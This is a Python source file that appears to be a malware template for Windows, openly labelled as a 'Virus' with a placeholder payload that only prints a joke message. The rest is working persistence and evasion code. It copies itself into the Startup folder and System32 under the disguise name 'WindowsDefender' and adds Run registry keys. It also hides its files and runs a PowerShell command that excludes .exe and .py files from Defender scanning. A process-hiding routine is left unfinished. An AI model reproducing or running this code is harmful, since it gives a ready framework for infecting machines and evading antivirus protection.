import ctypes.wintypes
import subprocess
import threading
import winreg
import ctypes
import sys
import os

kernel32 = ctypes.WinDLL("kernel32")
user32 = ctypes.WinDLL("user32")
ntdll = ctypes.WinDLL("ntdll")
psapi = ctypes.WinDLL("psapi")

# Your virus functionalities here
class Virus(object):
    def __init__(self):
        self._run()

    def _run(self):
        print("Virus hacker 99999 started. Hacking person's computer, stealing their bank accounts... WOOOOOOO successfully hacked! BOOM!")


class VirusConfig:
    ADD_TO_STARTUP = True
    HIDE_FILE = True
    ADD_REG_KEY = True
    ADD_AV_EXCLUSION = True
    COPY_FILENAME = "WindowsDefender"
    HIDE_PROCESS = True

# -------------------- #

class LPMODULEINFO(ctypes.Structure):
    _fields_ = [
        ("lpBaseOfDll", ctypes.c_void_p),
        ("SizeOfImage", ctypes.wintypes.DWORD),
        ("EntryPoint", ctypes.c_void_p)
    ]

def add_to_startup():
    username = os.environ["username"]
    src = get_file_location()
    filename = os.path.split(src)[1]
    ext = filename.split(".")[-1]
    dst = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{VirusConfig.COPY_FILENAME}.{ext}"

    copy_file(src, dst)

def get_file_location():
    return os.getcwd() + "\\" + sys.argv[0]

def add_regkey():
    src = get_file_location()
    filename = os.path.split(src)[1]
    ext = filename.split(".")[-1]
    dst = f"C:\\Windows\\System32\\{VirusConfig.COPY_FILENAME}.{ext}"

    copy_file(src, dst)

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, "WindowsDefender", None, winreg.REG_SZ, dst)
    winreg.CloseKey(key)

    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, "WindowsDefender", None, winreg.REG_SZ, dst)
    winreg.CloseKey(key)

def copy_file(src, dst):
    kernel32.CopyFileW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_bool]
    kernel32.CopyFileW(src, dst, False)

    if VirusConfig.HIDE_FILE:
        hide_file(dst)

def hide_file(filepath):
    kernel32.SetFileAttributesW.argtypes = [ctypes.c_wchar_p, ctypes.c_int]
    kernel32.SetFileAttributesW(filepath, 0x2)

def add_av_exclusion():
    subprocess.Popen("powershell Add-MpPreference -ExclusionExtension exe, py", shell=True)

def hide_process():
    return
    kernel32.GetCurrentProcessId.restype = ctypes.c_int
    process_id = kernel32.GetCurrentProcessId()

    kernel32.GetModuleHandleW.argtypes = [ctypes.wintypes.LPCWSTR]
    kernel32.GetModuleHandleW.restype = ctypes.c_void_p
    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    kernel32.GetProcAddress.restype = ctypes.c_void_p
    proc_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleW("ntdll"), b"NtQuerySystemInformation")

    psapi.GetModuleInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.HMODULE, ctypes.POINTER(LPMODULEINFO), ctypes.wintypes.DWORD]
    psapi.GetModuleInformation.restype = ctypes.wintypes.BOOL
    kernel32.GetCurrentProcess.restype = ctypes.wintypes.HANDLE
    kernel32.GetModuleHandleW.argtypes = [ctypes.c_int]
    mod_handle = kernel32.GetModuleHandleW(0)
    mod_info = LPMODULEINFO(0)
    text = psapi.GetModuleInformation(kernel32.GetCurrentProcess(), mod_handle, mod_info, LPMODULEINFO.__sizeof__(LPMODULEINFO))

def hook_dll():
    pass

def hide_process_thread():
    pass

def main():
    if VirusConfig.ADD_TO_STARTUP:
        add_to_startup()
    if VirusConfig.ADD_REG_KEY:
        add_regkey()
    if VirusConfig.HIDE_FILE:
        hide_file(os.getcwd() + "\\" + sys.argv[0])
    if VirusConfig.ADD_AV_EXCLUSION:
        add_av_exclusion()
    if VirusConfig.HIDE_PROCESS:
        hide_process()

    Virus()

if __name__ == "__main__":
    main()
